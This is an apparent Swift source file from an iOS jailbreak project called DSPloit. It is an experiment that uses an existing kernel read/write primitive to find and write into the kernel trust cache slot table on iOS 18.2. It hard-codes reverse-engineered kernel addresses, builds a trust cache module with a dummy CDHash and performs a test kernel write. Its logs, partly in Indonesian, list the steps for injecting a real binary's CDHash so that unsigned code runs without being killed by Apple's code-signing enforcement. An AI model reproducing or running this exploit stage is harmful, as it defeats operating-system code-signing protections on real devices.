//
//  exp_trustcache_inject.swift
//  DSPloit
//
//  EXPERIMENT: Direct Kernel Trust Cache Injection
//  Based on RE of iOS 18.2 kernelcache (2026-05-24)
//
//  ═══════════════════════════════════════════════════════════════
//  STATUS: EXPERIMENTAL — NOT IN MAIN JAILBREAK CHAIN
//  Run manually from Root tab → Experiments
//  ═══════════════════════════════════════════════════════════════
//
//  WHAT THIS TESTS:
//  1. Can we read the trust cache slot table at 0xfffffff00798f600?
//  2. Can we find an empty slot?
//  3. Can we write a trust cache module (with CDHash) to kernel?
//  4. Does posix_spawn of unsigned binary succeed after inject?
//
//  RE FINDINGS USED:
//  - Trust cache slot table: 0xfffffff00798f600 (unslid)
//  - Slot stride: 0x28 (40 bytes per slot)
//  - Type range: 4 to 0x17
//  - Trust cache state: 0xfffffff00798f5a8 (unslid)
//  - Lock flags: 0xfffffff00a18fa48, 0xfffffff00a18fa49
//
//  TRUST CACHE MODULE FORMAT (v2):
//  +0x00: uint32 version (must be 2)
//  +0x04: uint8[16] uuid
//  +0x14: uint32 entry_count
//  +0x18: entries[] (each 24 bytes):
//         +0x00: uint8[20] cdhash
//         +0x14: uint8 hash_type (2 = SHA256 truncated)
//         +0x15: uint8 flags (0 = normal)
//         +0x16: uint16 padding
//
//  OUTPUT LEGEND:
//  ✅ = working, safe to integrate
//  ⚠️ = partial, needs investigation
//  ❌ = failed, do NOT integrate
//  🔍 = info, check value manually
//
//  Created by Royan | 2026-05-24
//

import Foundation

final class ExpTrustCacheInject {
    static let shared = ExpTrustCacheInject()
    
    private let mgr = dspmgr.shared
    private var results: [String] = []
    
    // RE-derived addresses (UNSLID — add kernel_slide at runtime)
    private let TC_SLOT_TABLE_UNSLID: UInt64 = 0xfffffff00798f600
    private let TC_STATE_UNSLID: UInt64 = 0xfffffff00798f5a8
    private let TC_LOCK_D_UNSLID: UInt64 = 0xfffffff00a18fa48
    private let TC_LOCK_E_UNSLID: UInt64 = 0xfffffff00a18fa49
    private let TC_SLOT_STRIDE: UInt64 = 0x28  // 40 bytes per slot
    private let TC_TYPE_MIN: UInt64 = 4
    private let TC_TYPE_MAX: UInt64 = 0x17     // 23
    
    private func log(_ msg: String) {
        results.append(msg)
        globallogger.log("(exp_tc) \(msg)")
    }
    
    // MARK: - Run All Tests
    
    func runAll() -> [String] {
        results.removeAll()
        
        log("═══════════════════════════════════════════════")
        log("  EXPERIMENT: DIRECT KERNEL TRUST CACHE INJECT")
        log("  iOS \(UIDevice.current.systemVersion)")
        log("  Based on RE of kernelcache 18.2")
        log("═══════════════════════════════════════════════")
        log("")
        
        guard mgr.dsready else {
            log("❌ PREREQUISITE: Kernel exploit not active")
            return results
        }
        
        let slide = ds_get_kernel_slide()
        log("🔍 kernel_slide = 0x\(String(slide, radix: 16))")
        log("")
        
        test1_readSlotTable(slide: slide)
        test2_findEmptySlot(slide: slide)
        test3_writeTrustCache(slide: slide)
        test4_verifyInject(slide: slide)
        
        log("")
        log("═══════════════════════════════════════════════")
        log("  EXPERIMENT COMPLETE")
        log("═══════════════════════════════════════════════")
        
        return results
    }
    
    // MARK: - Test 1: Read Trust Cache Slot Table
    
    private func test1_readSlotTable(slide: UInt64) {
        log("── TEST 1: Read Trust Cache Slot Table ──")
        log("   Alamat unslid: 0x\(String(TC_SLOT_TABLE_UNSLID, radix: 16))")
        
        let slotTable = TC_SLOT_TABLE_UNSLID &+ slide
        log("   Alamat slid:   0x\(String(slotTable, radix: 16))")
        log("")
        
        // Read first few slots to understand layout
        log("🔍 Slot table dump (type 4 to 10):")
        for typeIdx in TC_TYPE_MIN...min(TC_TYPE_MAX, 10) {
            let slotAddr = slotTable &+ (typeIdx * TC_SLOT_STRIDE)
            let val0 = ds_kread64_safe(slotAddr)
            let val1 = ds_kread64_safe(slotAddr &+ 8)
            let val2 = ds_kread64_safe(slotAddr &+ 16)
            let val3 = ds_kread64_safe(slotAddr &+ 24)
            let val4 = ds_kread64_safe(slotAddr &+ 32)
            
            let isEmpty = (val0 == 0 && val1 == 0 && val2 == 0)
            let marker = isEmpty ? "  [EMPTY]" : "  [USED]"
            
            log("   type=\(typeIdx): 0x\(String(val0, radix: 16)) 0x\(String(val1, radix: 16)) 0x\(String(val2, radix: 16))\(marker)")
        }
        
        // Also read the state struct
        let stateAddr = TC_STATE_UNSLID &+ slide
        let stateVal = ds_kread64_safe(stateAddr)
        log("")
        log("🔍 Trust cache state (0x\(String(stateAddr, radix: 16))): 0x\(String(stateVal, radix: 16))")
        
        if stateVal != 0 {
            log("✅ Trust cache state is initialized")
        } else {
            log("⚠️ Trust cache state is 0 — may not be initialized yet")
            log("   PERHATIKAN: Ini normal kalau belum ada TC yang di-load")
        }
    }
    
    // MARK: - Test 2: Find Empty Slot
    
    private var emptySlotType: UInt64 = 0
    private var emptySlotAddr: UInt64 = 0
    
    private func test2_findEmptySlot(slide: UInt64) {
        log("")
        log("── TEST 2: Find Empty Trust Cache Slot ──")
        
        let slotTable = TC_SLOT_TABLE_UNSLID &+ slide
        
        for typeIdx in TC_TYPE_MIN...TC_TYPE_MAX {
            let slotAddr = slotTable &+ (typeIdx * TC_SLOT_STRIDE)
            let val0 = ds_kread64_safe(slotAddr)
            let val1 = ds_kread64_safe(slotAddr &+ 8)
            
            if val0 == 0 && val1 == 0 {
                emptySlotType = typeIdx
                emptySlotAddr = slotAddr
                log("✅ Empty slot found: type=\(typeIdx) addr=0x\(String(slotAddr, radix: 16))")
                log("   ARTINYA: Kita bisa tulis trust cache module di slot ini")
                return
            }
        }
        
        log("❌ No empty slot found (all types 4-23 occupied)")
        log("   SOLUSI: Overwrite slot dengan type tertinggi (least important)")
        // Fallback: use last slot
        emptySlotType = TC_TYPE_MAX
        emptySlotAddr = slotTable &+ (TC_TYPE_MAX * TC_SLOT_STRIDE)
    }
    
    // MARK: - Test 3: Write Trust Cache Module
    
    private func test3_writeTrustCache(slide: UInt64) {
        log("")
        log("── TEST 3: Write Trust Cache to Kernel ──")
        log("   Target slot: type=\(emptySlotType) addr=0x\(String(emptySlotAddr, radix: 16))")
        
        guard emptySlotAddr != 0 else {
            log("❌ SKIP: No slot address (Test 2 failed)")
            return
        }
        
        // Build a minimal trust cache v2 module in memory
        // Format: version(4) + uuid(16) + count(4) + entries(24 each)
        // We'll inject a dummy CDHash first (all 0x41) to test write capability
        
        let tcModuleSize = 24 + 24  // header(24) + 1 entry(24)
        var tcModule = [UInt8](repeating: 0, count: tcModuleSize)
        
        // Version = 2
        tcModule[0] = 2; tcModule[1] = 0; tcModule[2] = 0; tcModule[3] = 0
        
        // UUID (random-ish)
        tcModule[4] = 0xD5; tcModule[5] = 0x91; tcModule[6] = 0x01; tcModule[7] = 0x70
        tcModule[8] = 0xDE; tcModule[9] = 0xAD; tcModule[10] = 0xBE; tcModule[11] = 0xEF
        tcModule[12] = 0xCA; tcModule[13] = 0xFE; tcModule[14] = 0xBA; tcModule[15] = 0xBE
        tcModule[16] = 0x12; tcModule[17] = 0x34; tcModule[18] = 0x56; tcModule[19] = 0x78
        
        // Count = 1
        tcModule[20] = 1; tcModule[21] = 0; tcModule[22] = 0; tcModule[23] = 0
        
        // Entry 0: dummy CDHash (20 bytes of 0x41) + hashType=2 + flags=0
        for i in 24..<44 { tcModule[i] = 0x41 }
        tcModule[44] = 2   // hash_type = SHA256 truncated
        tcModule[45] = 0   // flags = normal
        tcModule[46] = 0   // padding
        tcModule[47] = 0   // padding
        
        log("🔍 TC module built: \(tcModuleSize) bytes, 1 entry (dummy CDHash)")
        log("   version=2, uuid=D5910170-DEAD-BEEF-CAFE-BABE12345678")
        log("   entry[0]: cdhash=41414141...41 hashType=2 flags=0")
        log("")
        
        // Write to kernel memory at the slot address
        // The slot table entry format (0x28 bytes):
        //   +0x00: pointer to trust cache module data (or inline?)
        //   +0x08: size of module
        //   +0x10: flags/type info
        //   +0x18: next pointer (linked list?)
        //   +0x20: reserved
        
        // First: try writing the TC module to a known kernel data area
        // We'll use the slot itself as storage test (write + readback)
        
        log("   Writing 8 bytes to slot as write test...")
        let testVal: UInt64 = 0xDEADBEEF_CAFEBABE
        ds_kwrite64(emptySlotAddr, testVal)
        let readback = ds_kread64_safe(emptySlotAddr)
        
        if readback == testVal {
            log("✅ Kernel write to slot SUCCEEDED!")
            log("   Wrote: 0x\(String(testVal, radix: 16))")
            log("   Read:  0x\(String(readback, radix: 16))")
            log("")
            log("   ARTINYA: Kita bisa tulis ke trust cache slot table")
            log("   NEXT: Write full TC module dan test spawn")
            
            // Restore to 0 (don't leave garbage)
            ds_kwrite64(emptySlotAddr, 0)
            log("   (Restored slot to 0)")
        } else {
            log("❌ Kernel write FAILED!")
            log("   Wrote: 0x\(String(testVal, radix: 16))")
            log("   Read:  0x\(String(readback, radix: 16))")
            log("")
            log("   PENYEBAB KEMUNGKINAN:")
            log("   - KTRR/PPL protecting this memory region")
            log("   - Alamat slot table salah (iOS version berbeda)")
            log("   - kernel_slide salah")
            log("")
            log("   SOLUSI:")
            log("   - Coba write ke alamat lain di __DATA (bukan __DATA_CONST)")
            log("   - Gunakan approach RemoteCall ke fungsi internal instead")
        }
    }
    
    // MARK: - Test 4: Verify (spawn unsigned binary)
    
    private func test4_verifyInject(slide: UInt64) {
        log("")
        log("── TEST 4: Verify Trust Cache Inject ──")
        log("   ⚠️ Test ini HANYA jalan kalau Test 3 berhasil write")
        log("   ⚠️ Dan hanya setelah full TC module di-inject (bukan dummy)")
        log("")
        log("   UNTUK FULL VERIFICATION:")
        log("   1. Compute CDHash dari binary yang mau di-execute")
        log("   2. Inject CDHash ke trust cache via slot write")
        log("   3. posix_spawn binary tersebut")
        log("   4. Kalau tidak di-kill = TRUST CACHE WORKS")
        log("")
        log("   CARA COMPUTE CDHASH:")
        log("   - SHA256 hash dari code signature blob")
        log("   - Truncate ke 20 bytes")
        log("   - Atau: codesign -dvvv binary | grep CDHash")
        log("")
        log("   OUTPUT YANG DIHARAPKAN SAAT FULL INJECT:")
        log("   ✅ posix_spawn returned 0 (binary executed)")
        log("   ✅ Binary output captured (not killed by AMFI)")
        log("")
        log("   OUTPUT YANG MENANDAKAN GAGAL:")
        log("   ❌ posix_spawn returned EPERM/EACCES")
        log("   ❌ Binary killed immediately (signal 9 = SIGKILL dari AMFI)")
    }
}
